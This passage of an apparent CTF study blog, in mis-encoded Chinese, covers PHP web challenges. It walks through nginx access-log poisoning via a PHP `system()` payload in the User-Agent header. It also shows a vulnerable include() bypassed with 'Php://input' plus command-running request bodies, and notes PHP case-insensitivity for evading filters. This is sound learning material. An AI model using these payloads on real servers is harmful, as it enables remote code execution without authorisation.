<p>ä¹Ÿå°±æ˜¯è¯´å¯ä»¥åœ¨è¯·æ±‚æŠ¥æ–‡ä¸­ä¿®æ”¹éƒ¨åˆ†ä¿¡æ¯ï¼Œæ’å…¥ PHP ä»£ç ï¼Œå†åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼ˆå‰é¢è®²è¿‡åªæœ‰ PHP ä»£ç ä¼šè¢«è§£æï¼Œæ–‡æœ¬ä¼šç›´æ¥è¿”å›å‰ç«¯ï¼‰ï¼Œä»¥è¾¾åˆ°æ‰§è¡Œæˆ‘ä»¬éœ€è¦çš„å‘½ä»¤çš„ç›®çš„ã€‚</p>
<p>è¯•è¯•çœ‹ï¼š</p>
<p>ç¬¬ä¸€æ¬¡å‘åŒ…ä¿®æ”¹è¯·æ±‚ä½“ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=&lt;?php system(&#x27;ls&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒæ¬¡å‘åŒ…ä¿®æ”¹è¯·æ±‚è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/var/log/nginx/access.log HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°äº†ä¸€å¤§å †æ—¥å¿—æ–‡æœ¬ï¼Œå¹¶æ²¡æœ‰ flag ï¼ŒåŸæ¥æ˜¯æ—¥å¿—æ–‡ä»¶é‡Œæ²¡æœ‰è®°å½•è¯·æ±‚ä½“ï¼Œemmmmmmâ€¦â€¦</p>
<p>ä½†æ—¥å¿—æ–‡ä»¶é‡Œè®°å½•äº†è¯·æ±‚å¤´ï¼Œå†æ¥ä¸€æ¬¡ï¼</p>
<p>ç¬¬ä¸€æ¬¡å‘åŒ…ä¿®æ”¹è¯·æ±‚å¤´<code>User-Agent</code>ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&lt;?php system(&#x27;ls&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸€å †æ—¥å¿—çš„æœ€åæ‰¾åˆ°äº† <code>fl0g.php index.php</code> ï¼Œæ€»ç®—æ˜¯æˆäº†ã€‚</p>
<p>æ¥ä¸‹æ¥åªéœ€è¦æŸ¥çœ‹æ–‡ä»¶ <code>fl0g.php</code> çš„å†…å®¹å°±å¥½ï¼ŒOKã€‚ï¼ˆPSï¼šä¸€å¤§å †æ—¥å¿—æœ‰ç‚¹ççœ¼ï¼Œflag éš¾æ‰¾ï¼‰</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/16/%E7%BB%88%E4%BA%8E%E8%BD%AE%E5%88%B0%E4%BA%86%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" data-id="cm9wms3ls0037kcuh4du4fs1z" data-title="ç»ˆäºè½®åˆ°äº†æ—¥å¿—æ³¨å…¥" class="article-share-link"><span class="fa fa-share">åˆ†äº«</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">å‘½ä»¤æ‰§è¡Œ</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-phpä¼ªåè®®ä¹‹input" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/" class="article-date">
  <time class="dt-published" datetime="2025-04-15T12:17:14.055Z" itemprop="datePublished">2025-04-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">å‘½ä»¤æ‰§è¡Œä¸æ–‡ä»¶åŒ…å«</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/">PHP ä¼ªåè®®ä¹‹ php://input</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤å¤„å¯å¤§å†™ç»•è¿‡ä¸ <code>php://input</code> ç›¸ç»“åˆã€‚</p>
<p>URLï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=Php://input</span><br></pre></td></tr></table></figure>

<p>è¯·æ±‚ä½“ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;ls&quot;);?&gt;//ç¬¬ä¸€æ¬¡è¯·æ±‚</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;tac fla*&quot;);?&gt;//ç¬¬äºŒæ¬¡è¯·æ±‚</span><br></pre></td></tr></table></figure>

<p>å€Ÿæ­¤è®²è®² <code>php://input</code> æ€ä¹ˆç”¨ã€‚</p>
<p><code>php://input</code> æ˜¯ä¸€ä¸ª PHP å†…ç½®çš„ä¼ªåè®®ï¼Œ<strong>ç”¨äºè¯»å– HTTP è¯·æ±‚ä¸­çš„åŸå§‹æ•°æ®</strong>ã€‚</p>
<p>ä»è¶…çº§å…¨å±€å˜é‡ <strong><code>$_POST</code></strong> æ•°ç»„è¯»å–çš„æ˜¯å¤„ç†è¿‡çš„ã€ä½œä¸ºä¸€ä¸ªä¸ªå…ƒç´ çš„å‚æ•°ã€‚å½“éœ€è¦<strong>è¯»å– POST åŸå§‹æ•°æ®</strong>æ—¶ï¼Œé€šå¸¸å°±ä¼šç”¨åˆ° <code>php://input</code> ä¼ªåè®®æ¥è¯»å–è¯·æ±‚ä½“ã€‚å› ä¸ºæ˜¯ç›´æ¥è¯»å–è¯·æ±‚ä½“ï¼Œæ‰€ä»¥ <strong>HTTP method ä¸æ˜¯ POST ä¹Ÿèƒ½è¯»å–</strong>ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€è¯·æ±‚æ—¶æŠ“åŒ…ï¼Œç„¶åä¿®æ”¹è¯·æ±‚ä½“ä¸º Payload ï¼Œå¹¶æŠŠ URL ä¸­å°†è¦è¢«æ–‡ä»¶åŒ…å«çš„å‚æ•°çš„å€¼æ”¹ä¸º <code>php://input</code> ï¼Œæœ€åå‘åŒ…çœ‹çœ‹å“åº”çš„æ•ˆæœã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/" data-id="cm9wms3ld000nkcuh7vvscbgb" data-title="PHP ä¼ªåè®®ä¹‹ php://input" class="article-share-link"><span class="fa fa-share">åˆ†äº«</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">å‘½ä»¤æ‰§è¡Œ</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">æ–‡ä»¶åŒ…å«</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-å¤§å°å†™ç»•è¿‡" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/" class="article-date">
  <time class="dt-published" datetime="2025-04-15T10:44:35.803Z" itemprop="datePublished">2025-04-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">æ‚é¡¹çŸ¥è¯†ç‚¹</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/">å¤§å°å†™ç»•è¿‡</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>PHP ä¸­æœ‰è®¸å¤šä¸ç”¨è€ƒè™‘å¤§å°å†™çš„åœ°æ–¹ï¼Œå¦‚ï¼š</p>
<ul>
<li><p><strong>PHP æ ‡ç­¾</strong><code>&lt;?php</code><br>ä¸€èˆ¬æƒ…å†µä¸‹å¿…é¡»ä¸¥æ ¼å°å†™ï¼Œä½†æŸäº›æœåŠ¡å™¨é…ç½®<strong>å¯èƒ½æ”¯æŒ</strong>å¤§å†™å¦‚ <code>&lt;?Php</code> è¿™æ ·çš„å†™æ³•ã€‚ç›®å‰åšçš„åšé¢˜èƒ½ç”¨ã€‚</p>
</li>
<li><p><strong>ä¼ªåè®®åç§°</strong><br><code>php://</code>ã€<code>data://</code>ç­‰ä¼ªåè®®åç§°å¯ä»¥å¤§å°å†™æ··ç”¨ï¼Œä½†ç›®å‰åšçš„é¢˜åªæœ‰<code>php://</code>ä¸ç”¨è€ƒè™‘å¤§å°å†™ï¼Œ<code>data://</code>å¤§å°å†™æ··ç”¨æˆ–æ˜¯å…¨å¤§å†™å°±æ— æ³•æ­£å¸¸æ–‡ä»¶åŒ…å«ã€‚æ‰€ä»¥ç°åœ¨å¤§å°å†™æ··ç”¨**åªè€ƒè™‘<code>php://</code>**ã€‚</p>
</li>
<li><p><strong>å…³é”®å­—å’Œæ§åˆ¶ç»“æ„</strong><br>å¦‚ <code>if</code>ã€<code>else</code>ã€<code>while</code>ã€<code>for</code>ã€<code>echo</code>ã€<code>return</code> ç­‰ã€‚ä¾‹å¦‚ï¼Œ<code>IF (...) &#123;...&#125;</code> æˆ– <code>ECHO &quot;Hello&quot;;</code> æ˜¯åˆæ³•çš„ã€‚</p>
</li>
<li><p><strong>å‡½æ•°åï¼ˆç”¨æˆ·å®šä¹‰å’Œå†…ç½®ï¼‰</strong><br>ç”¨æˆ·å®šä¹‰çš„å‡½æ•°å’ŒPHPå†…ç½®å‡½æ•°åœ¨è°ƒç”¨æ—¶ä¸åŒºåˆ†å¤§å°å†™ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="title function_ invoke__">myfunc</span>(); <span class="comment">// å¯è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">STRTOLOWER</span>(<span class="string">&quot;ABC&quot;</span>); <span class="comment">// ç­‰åŒäº strtolower()</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>ç±»åå’Œæ–¹æ³•å</strong><br>ç”¨æˆ·å®šä¹‰çš„ç±»åå’Œæ–¹æ³•ååœ¨å¼•ç”¨æ—¶ä¸åŒºåˆ†å¤§å°å†™ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">MYCLASS</span>(); <span class="comment">// å¯å®ä¾‹åŒ–</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myMethod</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">MYMETHOD</span>(); <span class="comment">// å¯è°ƒç”¨</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>å¸¸é‡ï¼ˆé€šè¿‡ <code>define</code> å®šä¹‰ä¸”å¯ç”¨å¤§å°å†™ä¸æ•æ„Ÿæ—¶ï¼‰</strong><br>ä½¿ç”¨ <code>define(&quot;NAME&quot;, value, true)</code> å®šä¹‰çš„å¸¸é‡ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸º <code>true</code> æ—¶å¤§å°å†™ä¸æ•æ„Ÿã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;GREETING&quot;</span>, <span class="string">&quot;Hello&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> greeting; <span class="comment">// è¾“å‡º &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>å¯¹å¤§å°å†™æ•æ„Ÿçš„éƒ¨åˆ†</strong>ï¼š</p>
<ul>
<li>å˜é‡åï¼ˆå¦‚ <code>$var</code> å’Œ <code>$VAR</code> ä¸åŒï¼‰ã€‚</li>
<li>å±æ€§åå’Œå¸¸é‡ï¼ˆé»˜è®¤æƒ…å†µä¸‹ï¼‰ã€‚</li>
<li>é­”æœ¯å¸¸é‡ï¼ˆå¦‚ <code>__FILE__</code>ã€<code>__LINE__</code>ï¼‰å’Œé­”æœ¯æ–¹æ³•ï¼ˆå¦‚ <code>__construct()</code>ï¼Œéœ€ä¸¥æ ¼æ‹¼å†™ï¼‰ã€‚</li>
<li>é¢„å®šä¹‰å˜é‡ï¼ˆå¦‚ <code>$_GET</code>ã€<code>$_POST</code>ï¼‰ã€‚</li>
</ul>
<p>å¯ä»¥æ´»ç”¨äºä¸€äº›é¢˜ï¼Œå¯æƒœçŸ¥é“çš„æœ‰ç‚¹æ™šã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/" data-id="cm9wms3lq002skcuh3rt22fqx" data-title="å¤§å°å†™ç»•è¿‡" class="article-share-link"><span class="fa fa-share">åˆ†äº«</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">æ‚é¡¹çŸ¥è¯†ç‚¹</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">ä¸‹ä¸€é¡µ &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">åˆ†ç±»</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQLæ³¨å…¥</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">ä¿¡æ¯æ”¶é›†</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">å‘½ä»¤æ‰§è¡Œä¸æ–‡ä»¶åŒ…å«</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/">æœªåˆ†ç±»</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">æ‚é¡¹çŸ¥è¯†ç‚¹</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%88%86%E7%A0%B4/">çˆ†ç ´</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/">ç¼–ç¨‹ç¬”è®°</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">æ ‡ç­¾</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cookie/" rel="tag">Cookie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQLæ³¨å…¥</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/URL/" rel="tag">URL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/requests/" rel="tag">requests</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">ä¿¡æ¯æ”¶é›†</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">å‘½ä»¤æ‰§è¡Œ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">æ–‡ä»¶åŒ…å«</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">æ‚é¡¹çŸ¥è¯†ç‚¹</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">çˆ†ç ´</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" rel="tag">é¢å‘å¯¹è±¡</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">æ ‡ç­¾äº‘</h3>
    <div class="widget tagcloud">
      <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/PHP/" style="font-size: 20px;">PHP</a> <a href="/tags/Python/" style="font-size: 11.67px;">Python</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQLæ³¨å…¥</a> <a href="/tags/Session/" style="font-size: 13.33px;">Session</a> <a href="/tags/URL/" style="font-size: 10px;">URL</a> <a href="/tags/requests/" style="font-size: 10px;">requests</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">ä¿¡æ¯æ”¶é›†</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 18.33px;">å‘½ä»¤æ‰§è¡Œ</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 15px;">æ–‡ä»¶åŒ…å«</a> <a href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 16.67px;">æ‚é¡¹çŸ¥è¯†ç‚¹</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 13.33px;">çˆ†ç ´</a> <a href="/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" style="font-size: 10px;">é¢å‘å¯¹è±¡</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">å½’æ¡£</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">å››æœˆ 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">æœ€æ–°æ–‡ç« </h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">$_GET ä¸ $_POST æ•°ç»„ç›¸å…³çŸ¥è¯†</a>
          </li>
        
          <li>
            <a href="/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/">filter ä¼ªåè®®ç»•è¿‡ dieï¼ˆWeb87ï¼‰</a>
          </li>
        
          <li>
            <a href="/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/">æ¡ä»¶ç«äº‰å˜ä½“é¢˜ç›®</a>
          </li>
        
          <li>
            <a href="/2025/04/24/Python-requests/">Python-requests</a>
          </li>
        
          <li>
            <a href="/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/">Python-é¢å‘å¯¹è±¡å…¥é—¨</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 Traveler2000<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>